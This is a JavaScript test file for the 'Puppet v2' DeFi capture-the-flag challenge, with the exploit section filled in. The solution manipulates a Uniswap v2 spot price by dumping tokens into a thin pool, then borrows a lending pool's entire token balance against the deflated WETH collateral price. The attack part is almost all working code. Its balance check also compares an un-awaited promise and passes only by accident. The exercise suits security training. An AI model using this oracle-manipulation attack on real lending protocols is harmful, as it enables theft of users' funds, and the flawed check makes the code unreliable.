const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect, assert } = require('chai');

describe('[Challenge] Puppet v2', function () {
    let deployer, attacker;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x1158e460913d00000", // 20 ETH
        ]);
        expect(await ethers.provider.getBalance(attacker.address)).to.eq(ethers.utils.parseEther('20'));

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        this.uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        this.uniswapRouter = await UniswapRouterFactory.deploy(
            this.uniswapFactory.address,
            this.weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await this.token.approve(
            this.uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapRouter.addLiquidityETH(
            this.token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        this.uniswapExchange = await UniswapPairFactory.attach(
            await this.uniswapFactory.getPair(this.token.address, this.weth.address)
        );
        expect(await this.uniswapExchange.balanceOf(deployer.address)).to.be.gt('0');

        // Deploy the lending pool
        this.lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            this.weth.address,
            this.token.address,
            this.uniswapExchange.address,
            this.uniswapFactory.address
        );

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('0.3'));
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(ethers.utils.parseEther('300000'));
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        const attackWeth = this.weth.connect(attacker);
        const attackToken = this.token.connect(attacker);
        const attackRouter = this.uniswapRouter.connect(attacker);
        const attackLender = this.lendingPool.connect(attacker);

        const logBalances = async (address, name) => {
            const ethBal = await ethers.provider.getBalance(address);
            const wethBal  = await attackWeth.balanceOf(address);
            const tknBal = await attackToken.balanceOf(address);

            console.log(`ETH Balance of ${name} is `, ethers.utils.formatEther(ethBal))
            console.log(`WETH Balance of ${name} is `, ethers.utils.formatEther(wethBal))
            console.log(`TKN Balance of ${name} is `, ethers.utils.formatEther(tknBal))
            console.log("")
        }

        // const tx = {
        //     to: attackWeth.address,
        //     value: ethers.utils.parseEther("20")
        // };

        // await attacker.sendTransaction(tx);

        await logBalances(attacker.address, "Attacker")

        // Approve WETH transfer
        await attackWeth.approve(attackRouter.address, ethers.utils.parseEther("20"));
        await attackToken.approve(attackRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);

        await attackRouter.swapExactTokensForTokens(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            ethers.utils.parseEther("9"),
            [attackToken.address, attackWeth.address],
            attacker.address,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
        )

        console.log("***SWAPPED 10000 TOKENS FOR ETH***")
        await logBalances(attacker.address, "Attacker")
        await logBalances(this.uniswapExchange.address, "UniSwapExchange")

        // Calculate deposit required
        await attackToken.approve(attackLender.address, ethers.utils.parseEther("300"));
        const deposit = await attackLender.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log("Required deposit for all tokens is", ethers.utils.formatEther(deposit));

        // Transfer remaining eth to weth (save some for gas)
        const tx = {
            to: attackWeth.address,
            value: ethers.utils.parseEther("19.9")
        }
        await attacker.sendTransaction(tx);

        console.log("***Deposited 19.9 ETH TO WETH***")
        await logBalances(attacker.address, "Attacker")

        const wethBalance = attackWeth.balanceOf(attacker.address);
        assert(wethBalance >= deposit, "Not enough WETH to take all funds");

        // Approve funds
        await attackWeth.approve(attackLender.address, ethers.utils.parseEther("300"))
        await attackLender.borrow(POOL_INITIAL_TOKEN_BALANCE, {
            gasLimit: 1e6
        });

        await logBalances(attacker.address, "Attacker")
        await logBalances(attackLender.address, "Lender")



    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});